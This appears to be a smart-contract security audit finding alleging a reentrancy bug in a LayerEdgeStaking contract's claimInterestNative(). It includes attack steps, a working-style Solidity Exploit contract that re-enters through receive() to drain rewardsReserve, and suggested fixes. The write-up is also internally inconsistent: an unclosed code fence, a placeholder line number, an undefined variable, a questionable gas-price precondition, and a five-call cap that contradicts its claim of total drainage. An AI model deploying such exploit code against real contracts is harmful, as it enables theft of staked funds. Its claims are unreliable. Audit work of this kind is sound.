# Attacker will drain rewardsReserve for stakers via reentrancy

### Summary

Missing reentrancy guard in `LayerEdgeStaking.sol` will cause complete loss of rewardsReserve for stakers as an attacker will recursively call `claimInterestNative()` before state update

**Root Cause**:  
In `LayerEdgeStaking.sol#L42` (or actual line number):
```solidity
function claimInterestNative() external {
    // Vulnerable ETH transfer before state update
    (bool success,) = payable(user).call{value: amount}(""); 

### Internal Pre-conditions

1. `rewardsReserve` must be at least 1 ETH  
2. `compoundingEnabled` must be set to `true`  
3. Victim must have unclaimed interest 

### External Pre-conditions

1. Gas price must be below 100 gwei to allow multiple reentrant calls

### Attack Path

1. **Attacker deploys malicious contract** with reentrancy hook in `receive()`  
2. **Attacker calls `stakeNative()`** with 1 ETH to become eligible for rewards  
3. **Attacker calls `claimInterestNative()`**  
4. **During ETH transfer**, malicious contract re-enters by calling `claimInterestNative()` again before `interestEarned` is reset  
5. **Repeat step 4** until `rewardsReserve` is drained  

### Impact

- The protocol suffers 100% loss of `rewardsReserve` (e.g., 500 ETH)  
- The attacker gains the entire rewards pool

pragma solidity ^0.8.20;

interface ILayerEdgeStaking {
    function stakeNative() external payable;
    function claimInterestNative() external;
    function rewardsReserve() external view returns (uint256);
}

contract Exploit {
    ILayerEdgeStaking public staking;
    uint256 public count;

    constructor(address _staking) {
        staking = ILayerEdgeStaking(_staking);
    }

    function attack() external payable {
        staking.stakeNative{value: 1 ether}();
        staking.claimInterestNative();
    }

    receive() external payable {
        if (count < 5 && staking.rewardsReserve() > 0) {
            count++;
            staking.claimInterestNative();
        }
    }
}
```

### Mitigation

1. Add `nonReentrant` modifier from OpenZeppelin:  
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
contract LayerEdgeStaking is ReentrancyGuard { ... }
```

2. Follow Checks-Effects-Interactions pattern:  
```solidity
function claimInterestNative() external nonReentrant {
    uint256 amount = user.interestEarned;
    user.interestEarned = 0;
    (bool success,) = payable(user).call{value: amount}("");
    require(success);
}
```
